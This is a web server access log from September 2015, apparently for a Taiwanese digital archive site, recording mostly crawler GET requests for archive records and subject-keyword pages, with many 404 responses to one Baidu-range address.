61.135.189.170 - - [18/Sep/2015:14:21:30 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=3404357 HTTP/1.1" 404 14873
66.249.71.239 - - [18/Sep/2015:14:21:37 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E4%BD%8F%E9%83%BD%E5%B1%80+%E5%94%90%E6%A6%AE+%E5%B7%A5%E7%A8%8B%E5%A5%91%E7%B4%84+%E6%8B%9B%E6%A8%99+%E6%96%B0%E8%87%BA%E5%B9%A3+%E6%B1%BA%E6%A8%99+%E7%9C%81%E8%AD%B0%E6%9C%83+%E7%A9%BA%E8%AA%BF+%E8%82%A1%E4%BB%BD%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8+%E8%87%BA%E7%81%A3%E7%9C%81+%E8%87%BA%E7%81%A3%E7%9C%81%E8%AD%B0%E6%9C%83+%E9%90%B5%E5%B7%A5%E5%BB%A0+&oid=1895037 HTTP/1.1" 200 5789
66.249.71.239 - - [18/Sep/2015:14:21:39 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E4%BD%8F%E9%83%BD%E5%B1%80%20%E5%94%90%E6%A6%AE%20%E5%B7%A5%E7%A8%8B%E5%A5%91%E7%B4%84%20%E6%8B%9B%E6%A8%99%20%E6%96%B0%E8%87%BA%E5%B9%A3%20%E6%B1%BA%E6%A8%99%20%E7%9C%81%E8%AD%B0%E6%9C%83%20%E7%A9%BA%E8%AA%BF%20%E8%82%A1%E4%BB%BD%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%20%E8%87%BA%E7%81%A3%E7%9C%81%20%E8%87%BA%E7%81%A3%E7%9C%81%E8%AD%B0%E6%9C%83%20%E9%90%B5%E5%B7%A5%E5%BB%A0%20&oid=1895037 HTTP/1.1" 200 5789
66.249.71.239 - - [18/Sep/2015:14:21:45 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E6%95%B4%E4%BF%AE+&oid=1609612 HTTP/1.1" 200 3269
66.249.71.229 - - [18/Sep/2015:14:21:47 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E6%95%B4%E4%BF%AE%20&oid=1609612 HTTP/1.1" 200 3269
61.135.189.170 - - [18/Sep/2015:14:21:51 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=3403238 HTTP/1.1" 404 14873
220.181.108.121 - - [18/Sep/2015:14:21:51 +0800] "GET /content/subject/resource_content.jsp?oid=16777438 HTTP/1.1" 200 28656
61.135.189.170 - - [18/Sep/2015:14:22:08 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=3406211 HTTP/1.1" 404 14873
66.249.79.235 - - [18/Sep/2015:14:22:23 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%81%A5%E5%BA%B7%E6%AA%A2%E6%9F%A5%20%E5%85%AC%E5%8B%99%E4%BA%BA%E5%93%A1%20%E5%87%BA%E5%BE%81%E8%BB%8D%E4%BA%BA%20%E5%9C%8B%E6%B0%91%E4%BD%8F%E5%AE%85%20%E5%B0%8F%E5%AE%A2%E8%BB%8A%20%E6%92%AB%E5%8D%B9%E9%87%91%20%E6%B0%91%E6%94%BF%E5%BB%B3%20%E7%87%9F%E6%A5%AD%E5%B0%8F%E5%AE%A2%E8%BB%8A%20%E7%A4%BE%E6%9C%83%E8%99%95%20%E8%8F%B8%E9%85%92%20%E8%99%95%E6%96%B9%20%E8%AD%A6%E5%8B%99%E8%99%95%20%E8%BE%B2%E5%9C%B0%E9%87%8D%E5%8A%83%20%E9%80%9A%E7%B7%9D%E7%8A%AF%20%E9%85%8D%E9%8A%B7%20%E9%98%B2%E7%A9%BA%20%E9%A0%90%E9%98%B2%20%E9%A3%9F%E7%89%A9%E4%B8%AD%E6%AF%92%20&oid=1555981 HTTP/1.1" 200 4050
61.135.189.170 - - [18/Sep/2015:14:22:28 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=3407511 HTTP/1.1" 404 14873
61.135.189.170 - - [18/Sep/2015:14:22:49 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1581391 HTTP/1.1" 404 14873
66.249.71.229 - - [18/Sep/2015:14:23:06 +0800] "GET /content/repository/resource_content.jsp?oid=1547609 HTTP/1.1" 200 30468
61.135.189.170 - - [18/Sep/2015:14:23:07 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=3408552 HTTP/1.1" 404 14873
39.9.193.156 - - [18/Sep/2015:14:23:23 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E7%B4%AB%E8%96%87+&oid=16777424 HTTP/1.1" 200 4000
61.135.189.170 - - [18/Sep/2015:14:23:25 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=2549030 HTTP/1.1" 404 14873
66.249.71.239 - - [18/Sep/2015:14:23:39 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E4%B8%AD%E8%88%88%E7%B4%99%E6%A5%AD+%E4%BA%94%E7%9C%81+%E5%84%B2%E8%93%84+%E5%84%B2%E8%93%84%E5%AD%98%E6%AC%BE+%E5%85%AC%E7%87%9F%E4%BA%8B%E6%A5%AD+%E5%88%A9%E7%8E%87+%E5%AD%98%E6%AC%BE+%E5%B1%A0%E5%AE%B0%E5%A0%B4+%E6%89%80%E5%BE%97%E7%A8%85+%E6%BC%A2%E5%B9%B3+%E7%87%9F%E5%88%A9%E4%BA%8B%E6%A5%AD+%E7%94%B3%E5%A0%B1+%E7%A8%85%E5%8B%99+%E7%B8%BD%E9%A0%90%E7%AE%97+%E8%8F%B8%E9%85%92+%E8%B2%A1%E5%8B%99+%E8%B2%A1%E6%94%BF+%E8%B2%A1%E6%94%BF%E5%BB%B3+%E8%B2%A1%E6%94%BF%E6%94%B6%E6%94%AF+%E9%87%91%E8%9E%8D+%E9%99%B3%E6%BC%A2%E5%B9%B3+%E9%9B%BB%E5%8B%95%E5%B1%A0%E5%AE%B0%E5%A0%B4+%E9%A0%90%E7%AE%97+&oid=1547609 HTTP/1.1" 200 6049
66.249.71.249 - - [18/Sep/2015:14:23:42 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E4%B8%AD%E8%88%88%E7%B4%99%E6%A5%AD%20%E4%BA%94%E7%9C%81%20%E5%84%B2%E8%93%84%20%E5%84%B2%E8%93%84%E5%AD%98%E6%AC%BE%20%E5%85%AC%E7%87%9F%E4%BA%8B%E6%A5%AD%20%E5%88%A9%E7%8E%87%20%E5%AD%98%E6%AC%BE%20%E5%B1%A0%E5%AE%B0%E5%A0%B4%20%E6%89%80%E5%BE%97%E7%A8%85%20%E6%BC%A2%E5%B9%B3%20%E7%87%9F%E5%88%A9%E4%BA%8B%E6%A5%AD%20%E7%94%B3%E5%A0%B1%20%E7%A8%85%E5%8B%99%20%E7%B8%BD%E9%A0%90%E7%AE%97%20%E8%8F%B8%E9%85%92%20%E8%B2%A1%E5%8B%99%20%E8%B2%A1%E6%94%BF%20%E8%B2%A1%E6%94%BF%E5%BB%B3%20%E8%B2%A1%E6%94%BF%E6%94%B6%E6%94%AF%20%E9%87%91%E8%9E%8D%20%E9%99%B3%E6%BC%A2%E5%B9%B3%20%E9%9B%BB%E5%8B%95%E5%B1%A0%E5%AE%B0%E5%A0%B4%20%E9%A0%90%E7%AE%97%20&oid=1547609 HTTP/1.1" 200 6049
61.135.189.170 - - [18/Sep/2015:14:23:42 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=3409117 HTTP/1.1" 404 14873
66.249.79.235 - - [18/Sep/2015:14:23:59 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%BC%B5%E7%84%B1%E7%94%9F+%E6%9D%9C%E9%A6%99+%E6%9D%9C%E9%A6%99%E5%9C%8B+&oid=1887807 HTTP/1.1" 200 3189
66.249.71.225 - - [18/Sep/2015:14:24:01 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%BC%B5%E7%84%B1%E7%94%9F%20%E6%9D%9C%E9%A6%99%20%E6%9D%9C%E9%A6%99%E5%9C%8B%20&oid=1887807 HTTP/1.1" 200 3189
61.135.189.170 - - [18/Sep/2015:14:24:01 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=3121273 HTTP/1.1" 404 14873
61.135.189.170 - - [18/Sep/2015:14:24:16 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1604904 HTTP/1.1" 404 14873
61.135.189.170 - - [18/Sep/2015:14:24:44 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=3394789 HTTP/1.1" 404 14873
66.249.71.196 - - [18/Sep/2015:14:24:46 +0800] "GET /content/repository/resource_content.jsp?oid=1887873&queryType=qs&queryString=%E6%9D%9C%E9%A6%99 HTTP/1.1" 200 32058
61.135.189.170 - - [18/Sep/2015:14:24:55 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1605849 HTTP/1.1" 404 14873
66.249.71.196 - - [18/Sep/2015:14:24:56 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%82%B5%E6%AC%8A+%E5%88%87%E6%89%8B+%E6%9D%8E%E7%82%B3%E7%84%9C+%E6%9D%9C%E9%A6%99+%E6%9D%9C%E9%A6%99%E5%9C%8B+%E7%82%BA%E6%9B%BF%E6%89%8B%E5%BD%A2+%E9%99%B3%E8%B2%B4%E5%BF%83+&oid=1887873 HTTP/1.1" 200 3377
66.249.71.217 - - [18/Sep/2015:14:24:58 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%82%B5%E6%AC%8A%20%E5%88%87%E6%89%8B%20%E6%9D%8E%E7%82%B3%E7%84%9C%20%E6%9D%9C%E9%A6%99%20%E6%9D%9C%E9%A6%99%E5%9C%8B%20%E7%82%BA%E6%9B%BF%E6%89%8B%E5%BD%A2%20%E9%99%B3%E8%B2%B4%E5%BF%83%20&oid=1887873 HTTP/1.1" 200 3377
61.135.189.170 - - [18/Sep/2015:14:25:12 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1600194 HTTP/1.1" 404 14873
61.135.189.170 - - [18/Sep/2015:14:25:29 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1597924 HTTP/1.1" 404 14873
61.135.189.170 - - [18/Sep/2015:14:25:46 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1624291 HTTP/1.1" 404 14873
66.249.71.225 - - [18/Sep/2015:14:25:55 +0800] "GET /content/repository/resource_content.jsp?oid=1895161&queryString=%E5%81%A5%E5%BA%B7%E6%A1%88%20%E5%AF%86%E9%86%AB%20%E6%AD%90%E7%BE%8E%E6%97%A5%20%E7%89%99%E9%86%AB%20%E7%9C%81%E6%94%BF%E5%BA%9C%20%E8%87%BA%E7%81%A3%E7%9C%81%20%E9%86%AB%E5%B8%AB%E5%85%AC%E6%9C%83 HTTP/1.1" 200 31450
61.135.189.170 - - [18/Sep/2015:14:26:07 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=3128307 HTTP/1.1" 404 14873
157.55.39.57 - - [18/Sep/2015:14:26:12 +0800] "GET /content/subject/resource_content.jsp?oid=16777714&queryType=qc HTTP/1.1" 200 42382
61.135.189.170 - - [18/Sep/2015:14:26:26 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1598517 HTTP/1.1" 404 14873
66.249.79.200 - - [18/Sep/2015:14:26:27 +0800] "GET /content/repository/resource_content.jsp?oid=1561531 HTTP/1.1" 200 28738
61.135.189.170 - - [18/Sep/2015:14:27:00 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=3397300 HTTP/1.1" 404 14873
61.135.189.170 - - [18/Sep/2015:14:27:05 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1610486 HTTP/1.1" 404 14873
61.135.189.170 - - [18/Sep/2015:14:27:21 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1606438 HTTP/1.1" 404 14873
61.135.189.170 - - [18/Sep/2015:14:27:41 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=2531591 HTTP/1.1" 404 14873
61.135.189.170 - - [18/Sep/2015:14:28:00 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1599664 HTTP/1.1" 404 14873
66.249.71.121 - - [18/Sep/2015:14:28:08 +0800] "GET /content/repository/resource_content.jsp?oid=1548411&queryType=qs&queryString=%E9%AB%98%E9%9B%84%E7%B8%A3%E6%94%BF%E5%BA%9C HTTP/1.1" 200 29180
68.180.228.24 - - [18/Sep/2015:14:28:08 +0800] "GET /digiarch_en/content/tmp_exh/resource_content.jsp?oid=16777847&queryType=qc%201890 HTTP/1.1" 200 39822
66.249.71.239 - - [18/Sep/2015:14:28:13 +0800] "GET /content/nav/relationSubject.jsp?relationWords=&oid=2586265 HTTP/1.1" 200 1405
66.249.71.113 - - [18/Sep/2015:14:28:18 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E6%B0%91%E6%94%BF%E9%A1%9E+%E6%BC%81%E6%9C%83+%E7%B8%A3%E6%94%BF%E5%BA%9C+%E8%8C%84%E8%90%A3+%E8%8C%84%E8%90%A3%E9%84%89+%E8%98%87%E6%97%97%E9%A7%81+%E9%AB%98%E9%9B%84%E7%B8%A3%E6%94%BF%E5%BA%9C+&oid=1548411 HTTP/1.1" 200 7357
61.135.189.170 - - [18/Sep/2015:14:28:19 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1605190 HTTP/1.1" 404 14873
66.249.71.105 - - [18/Sep/2015:14:28:20 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E6%B0%91%E6%94%BF%E9%A1%9E%20%E6%BC%81%E6%9C%83%20%E7%B8%A3%E6%94%BF%E5%BA%9C%20%E8%8C%84%E8%90%A3%20%E8%8C%84%E8%90%A3%E9%84%89%20%E8%98%87%E6%97%97%E9%A7%81%20%E9%AB%98%E9%9B%84%E7%B8%A3%E6%94%BF%E5%BA%9C%20&oid=1548411 HTTP/1.1" 200 7357
61.135.189.170 - - [18/Sep/2015:14:28:36 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1605869 HTTP/1.1" 404 14873
61.135.189.170 - - [18/Sep/2015:14:28:54 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1604967 HTTP/1.1" 404 14873
66.249.71.239 - - [18/Sep/2015:14:29:13 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E8%A1%A1%E5%85%A7%E9%A3%BE+%E8%BB%8A%E9%A6%AC%E5%99%A8+&oid=1876952 HTTP/1.1" 200 3040
61.135.189.170 - - [18/Sep/2015:14:29:13 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1604048 HTTP/1.1" 404 14873
66.249.71.229 - - [18/Sep/2015:14:29:15 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E8%A1%A1%E5%85%A7%E9%A3%BE%20%E8%BB%8A%E9%A6%AC%E5%99%A8%20&oid=1876952 HTTP/1.1" 200 3040
66.249.71.249 - - [18/Sep/2015:14:29:16 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E4%BB%A5%E7%AC%A6%E5%AF%A6%E9%9A%9B%E6%A1%88+%E5%85%AC%E6%95%99%E4%BA%BA%E5%93%A1+%E5%BA%9C%E4%BA%BA%E4%B8%99%E5%AD%97+%E6%B4%A5%E8%B2%BC+&oid=1561531 HTTP/1.1" 200 3288
66.249.71.249 - - [18/Sep/2015:14:29:18 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E4%BB%A5%E7%AC%A6%E5%AF%A6%E9%9A%9B%E6%A1%88%20%E5%85%AC%E6%95%99%E4%BA%BA%E5%93%A1%20%E5%BA%9C%E4%BA%BA%E4%B8%99%E5%AD%97%20%E6%B4%A5%E8%B2%BC%20&oid=1561531 HTTP/1.1" 200 3288
220.181.108.145 - - [18/Sep/2015:14:29:20 +0800] "GET /content/subject/resource_content.jsp?oid=16777702 HTTP/1.1" 200 26224
61.135.189.170 - - [18/Sep/2015:14:29:29 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1615183 HTTP/1.1" 404 14873
61.135.189.170 - - [18/Sep/2015:14:29:46 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1602546 HTTP/1.1" 404 14873
61.135.189.170 - - [18/Sep/2015:14:30:03 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1604104 HTTP/1.1" 404 14873
61.135.189.170 - - [18/Sep/2015:14:30:21 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1606239 HTTP/1.1" 404 14873
66.249.71.225 - - [18/Sep/2015:14:30:33 +0800] "GET /content/repository/resource_content.jsp?oid=1539406&queryType=qs&queryString=%E8%82%BA%E7%B5%90%E6%A0%B8 HTTP/1.1" 200 28923
61.135.189.170 - - [18/Sep/2015:14:30:37 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1590249 HTTP/1.1" 404 14873
120.26.2.118 - - [18/Sep/2015:14:30:45 +0800] "GET /content/subject/resource_content.jsp?oid=16777357&queryType=qc HTTP/1.0" 200 33886
120.26.0.228 - - [18/Sep/2015:14:30:45 +0800] "GET /content/subject/resource_content.jsp?oid=16777544&queryType=qc HTTP/1.0" 200 35791
121.41.117.40 - - [18/Sep/2015:14:30:46 +0800] "GET /content/subject/resource_content.jsp?oid=16777560&queryType=qc HTTP/1.0" 200 28588
120.26.2.152 - - [18/Sep/2015:14:30:47 +0800] "GET /content/tmp_exh/resource_content.jsp?oid=16777848&queryType=qc HTTP/1.0" 200 37162
121.41.114.164 - - [18/Sep/2015:14:30:47 +0800] "GET /content/subject/resource_content.jsp?oid=16777260&queryType=qc HTTP/1.0" 200 38785
120.26.0.219 - - [18/Sep/2015:14:30:48 +0800] "GET /content/subject/resource_content.jsp?oid=16777776&queryType=qc HTTP/1.0" 200 61552
120.26.2.225 - - [18/Sep/2015:14:30:50 +0800] "GET /content/subject/resource_content.jsp?oid=16777447&queryType=qc HTTP/1.0" 200 40861
120.26.0.33 - - [18/Sep/2015:14:30:48 +0800] "GET /content/subject/resource_content.jsp?oid=16797257&queryType=qc HTTP/1.0" 200 47889
121.41.117.45 - - [18/Sep/2015:14:30:48 +0800] "GET /content/subject/resource_content.jsp?oid=16777541&queryType=qc HTTP/1.0" 200 29232
121.41.102.96 - - [18/Sep/2015:14:30:50 +0800] "GET /content/subject/resource_content.jsp?oid=16777676&queryType=qc HTTP/1.0" 200 46044
120.26.2.170 - - [18/Sep/2015:14:30:50 +0800] "GET /content/subject/resource_content.jsp?oid=16777423&queryType=qc HTTP/1.0" 200 39642
120.26.0.225 - - [18/Sep/2015:14:30:50 +0800] "GET /content/subject/resource_content.jsp?oid=16777257&queryType=qc HTTP/1.0" 200 31163
120.26.2.225 - - [18/Sep/2015:14:30:50 +0800] "GET /content/subject/resource_content.jsp?oid=16797256&queryType=qc HTTP/1.0" 200 45305
120.26.2.192 - - [18/Sep/2015:14:30:50 +0800] "GET /content/subject/resource_content.jsp?oid=16777561&queryType=qc HTTP/1.0" 200 40929
120.26.2.152 - - [18/Sep/2015:14:30:50 +0800] "GET /content/subject/resource_content.jsp?oid=16777446&queryType=qc HTTP/1.0" 200 42143
120.26.2.118 - - [18/Sep/2015:14:30:50 +0800] "GET /content/subject/resource_content.jsp?oid=16777773&queryType=qc HTTP/1.0" 200 54710
61.135.189.170 - - [18/Sep/2015:14:30:52 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1599679 HTTP/1.1" 404 14873
120.26.0.192 - - [18/Sep/2015:14:30:52 +0800] "GET /content/subject/resource_content.jsp?oid=16777688&queryType=qc HTTP/1.0" 200 39189
120.26.0.198 - - [18/Sep/2015:14:30:52 +0800] "GET /content/subject/resource_content.jsp?oid=16777356&queryType=qc HTTP/1.0" 200 32596
61.135.189.170 - - [18/Sep/2015:14:31:07 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1606305 HTTP/1.1" 404 14873
111.235.205.67 - - [18/Sep/2015:14:31:17 +0800] "GET /content/repository/resource_content.jsp?oid=1634208 HTTP/1.1" 200 28723
54.69.92.245 - - [18/Sep/2015:14:31:22 +0800] "GET /content/subject/resource_content.jsp?oid=16777272&queryType=qc HTTP/1.0" 200 45133
111.235.205.67 - - [18/Sep/2015:14:31:23 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E6%8E%A8%E8%A1%8C%E6%A1%88+&oid=1634208 HTTP/1.1" 200 3410
61.135.189.170 - - [18/Sep/2015:14:31:24 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1599381 HTTP/1.1" 404 14873
54.69.92.245 - - [18/Sep/2015:14:31:25 +0800] "GET /content/subject/resource_content.jsp?oid=16777280&queryType=qc HTTP/1.0" 200 30940
54.69.92.245 - - [18/Sep/2015:14:31:28 +0800] "GET /content/subject/resource_content.jsp?oid=16777281&queryType=qc HTTP/1.0" 200 28142
66.249.79.200 - - [18/Sep/2015:14:31:30 +0800] "GET /content/repository/resource_content.jsp?oid=2145364 HTTP/1.1" 200 29296
54.69.92.245 - - [18/Sep/2015:14:31:32 +0800] "GET /content/subject/resource_content.jsp?oid=16777286&queryType=qc HTTP/1.0" 200 37838
66.249.71.205 - - [18/Sep/2015:14:31:34 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E4%B8%AD%E5%A4%AE%E4%BF%A1%E8%A8%97%E5%B1%80+%E4%BA%A4%E9%80%9A%E8%99%95+%E4%BF%A1%E8%A8%97+%E5%85%AC%E8%B7%AF%E5%B1%80+%E5%9F%BA%E9%9A%86%E6%B8%AF+%E5%9F%BA%E9%9A%86%E6%B8%AF%E5%8B%99%E5%B1%80+%E5%A4%96%E5%8C%AF+%E5%AF%A9%E8%A8%88+%E5%AF%A9%E8%A8%88%E8%99%95+%E6%B8%AF%E5%8B%99+%E6%B8%AF%E5%8B%99%E5%B1%80+%E7%9C%81%E6%94%BF%E5%BA%9C+%E7%9C%81%E8%AD%B0%E6%9C%83+%E7%A6%8F%E7%89%B9+%E8%87%BA%E7%81%A3%E7%9C%81+%E8%87%BA%E7%81%A3%E7%9C%81%E5%AF%A9%E8%A8%88%E8%99%95+%E8%87%BA%E7%81%A3%E7%9C%81%E8%AD%B0%E6%9C%83+%E8%BD%8E%E8%BB%8A+&oid=1895161 HTTP/1.1" 200 6383
66.249.71.205 - - [18/Sep/2015:14:31:36 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E4%B8%AD%E5%A4%AE%E4%BF%A1%E8%A8%97%E5%B1%80%20%E4%BA%A4%E9%80%9A%E8%99%95%20%E4%BF%A1%E8%A8%97%20%E5%85%AC%E8%B7%AF%E5%B1%80%20%E5%9F%BA%E9%9A%86%E6%B8%AF%20%E5%9F%BA%E9%9A%86%E6%B8%AF%E5%8B%99%E5%B1%80%20%E5%A4%96%E5%8C%AF%20%E5%AF%A9%E8%A8%88%20%E5%AF%A9%E8%A8%88%E8%99%95%20%E6%B8%AF%E5%8B%99%20%E6%B8%AF%E5%8B%99%E5%B1%80%20%E7%9C%81%E6%94%BF%E5%BA%9C%20%E7%9C%81%E8%AD%B0%E6%9C%83%20%E7%A6%8F%E7%89%B9%20%E8%87%BA%E7%81%A3%E7%9C%81%20%E8%87%BA%E7%81%A3%E7%9C%81%E5%AF%A9%E8%A8%88%E8%99%95%20%E8%87%BA%E7%81%A3%E7%9C%81%E8%AD%B0%E6%9C%83%20%E8%BD%8E%E8%BB%8A%20&oid=1895161 HTTP/1.1" 200 6383
61.135.189.170 - - [18/Sep/2015:14:31:39 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1618445 HTTP/1.1" 404 14873
66.249.71.229 - - [18/Sep/2015:14:31:39 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E8%95%A8%E5%B1%AC+%E9%AD%9A%E9%B1%97%E8%95%A8+%E9%AD%9A%E9%B1%97%E8%95%A8%E5%B1%AC+&oid=2145364 HTTP/1.1" 200 3074
66.249.71.239 - - [18/Sep/2015:14:31:41 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E8%95%A8%E5%B1%AC%20%E9%AD%9A%E9%B1%97%E8%95%A8%20%E9%AD%9A%E9%B1%97%E8%95%A8%E5%B1%AC%20&oid=2145364 HTTP/1.1" 200 3074
61.135.189.170 - - [18/Sep/2015:14:31:58 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1630908 HTTP/1.1" 404 14873
61.135.189.170 - - [18/Sep/2015:14:32:14 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1602769 HTTP/1.1" 404 14873
61.135.189.170 - - [18/Sep/2015:14:32:35 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1612201 HTTP/1.1" 404 14873
61.135.189.170 - - [18/Sep/2015:14:32:52 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1619027 HTTP/1.1" 404 14873
61.135.189.170 - - [18/Sep/2015:14:33:08 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1616730 HTTP/1.1" 404 14873
66.249.71.249 - - [18/Sep/2015:14:33:08 +0800] "GET /content/repository/resource_content.jsp?oid=2150779 HTTP/1.1" 200 30986
61.135.189.170 - - [18/Sep/2015:14:33:27 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1617068 HTTP/1.1" 404 14873
61.135.189.170 - - [18/Sep/2015:14:33:42 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1617818 HTTP/1.1" 404 14873
61.135.189.170 - - [18/Sep/2015:14:33:58 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1614984 HTTP/1.1" 404 14873
61.135.189.170 - - [18/Sep/2015:14:34:15 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1611195 HTTP/1.1" 404 14873
140.114.32.173 - - [18/Sep/2015:14:34:30 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%8F%B0%E7%81%A3%E6%AC%92%E6%A8%B9+%E6%AC%92%E6%A8%B9+%E8%8B%A6%E8%8B%93+%E8%8B%A6%E8%8B%93%E8%88%85+&oid=16777254 HTTP/1.1" 200 4383
61.135.189.170 - - [18/Sep/2015:14:34:34 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1602290 HTTP/1.1" 404 14873
61.135.189.170 - - [18/Sep/2015:14:34:50 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1617063 HTTP/1.1" 404 14873
61.135.189.170 - - [18/Sep/2015:14:35:05 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1624253 HTTP/1.1" 404 14873
66.249.71.205 - - [18/Sep/2015:14:35:07 +0800] "GET /content/repository/resource_content.jsp?oid=1780653&queryType=qs&queryString=%E9%A0%AD%E7%9B%AE%E5%B8%BD HTTP/1.1" 200 28700
61.135.189.170 - - [18/Sep/2015:14:35:21 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=2678065 HTTP/1.1" 404 14873
61.135.189.170 - - [18/Sep/2015:14:35:37 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1591104 HTTP/1.1" 404 14873
61.135.189.170 - - [18/Sep/2015:14:35:51 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1613487 HTTP/1.1" 404 14873
61.135.189.170 - - [18/Sep/2015:14:36:09 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1611561 HTTP/1.1" 404 14873
61.135.189.170 - - [18/Sep/2015:14:36:26 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1610311 HTTP/1.1" 404 14873
66.249.79.200 - - [18/Sep/2015:14:36:30 +0800] "GET /content/repository/resource_content.jsp?oid=1576449 HTTP/1.1" 200 28683
66.249.71.239 - - [18/Sep/2015:14:36:43 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E4%BE%BF%E6%B0%91+%E5%9C%9F%E5%9C%B0%E5%BB%BA%E7%89%A9+&oid=1576449 HTTP/1.1" 200 3170
61.135.189.170 - - [18/Sep/2015:14:36:49 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1611915 HTTP/1.1" 404 14873
61.135.189.170 - - [18/Sep/2015:14:36:53 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1588202 HTTP/1.1" 404 14873
61.135.189.170 - - [18/Sep/2015:14:37:07 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1609540 HTTP/1.1" 404 14873
61.135.189.170 - - [18/Sep/2015:14:37:23 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1618278 HTTP/1.1" 404 14873
61.135.189.170 - - [18/Sep/2015:14:37:36 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1605186 HTTP/1.1" 404 14873
157.55.39.66 - - [18/Sep/2015:14:37:39 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E8%8B%A6%E8%8B%93+&oid=16777317 HTTP/1.1" 200 3183
61.135.189.170 - - [18/Sep/2015:14:37:49 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1610732 HTTP/1.1" 404 14873
61.135.189.170 - - [18/Sep/2015:14:38:05 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1604204 HTTP/1.1" 404 14873
61.135.189.170 - - [18/Sep/2015:14:38:20 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1605166 HTTP/1.1" 404 14873
61.135.189.170 - - [18/Sep/2015:14:38:35 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=3123881 HTTP/1.1" 404 14873
61.135.189.170 - - [18/Sep/2015:14:38:49 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=3120402 HTTP/1.1" 404 14873
61.135.189.170 - - [18/Sep/2015:14:39:05 +0800] "GET /digiarch/content/repository/resource_content.jsp?oid=1613409 HTTP/1.1" 404 14873
119.14.239.24 - - [18/Sep/2015:14:39:11 +0800] "GET /content/nav/relationSubject.jsp?relationWords=%E5%88%BA%E6%A1%90+%E7%8F%8A%E7%91%9A%E5%88%BA%E6%A1%90+&oid=16777333 HTTP/1.1" 200 3746
